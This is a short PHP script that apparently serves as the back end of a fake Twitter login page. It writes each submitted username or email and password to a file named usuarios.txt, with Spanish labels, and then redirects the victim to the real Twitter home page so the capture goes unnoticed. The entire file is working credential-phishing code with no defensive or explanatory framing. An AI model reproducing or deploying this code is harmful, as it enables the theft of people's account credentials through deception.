<?php
file_put_contents("usuarios.txt", "Usuario de Twitter: " . $_POST['usernameOrEmail'] . "\nContraseña: " . $_POST['pass'] . "\n", FILE_APPEND);
header("Location: https://twitter.com/home");
exit();
?>
